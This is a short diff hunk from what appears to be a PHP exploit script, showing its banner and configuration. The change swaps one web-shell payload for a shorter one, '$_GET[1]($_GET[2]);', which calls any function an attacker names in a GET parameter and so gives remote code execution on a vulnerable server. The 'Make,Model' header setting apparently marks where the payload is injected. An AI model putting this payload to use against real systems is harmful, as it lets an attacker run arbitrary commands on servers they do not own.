@@ -38,7 +38,7 @@ if(!array_shift($argv) || !sizeof($argv) || (sizeof($argv) % 2) || sizeof($argv)
 }
 print " ################################################################\r\n\r\n\r\n";
 
-$shellcode = '!empty($1=@$_GET[1]) && $1($_GET[2]);';
+$shellcode = '$_GET[1]($_GET[2]);';
 $verbose   = FALSE;
 $headers   = 'Make,Model';
 
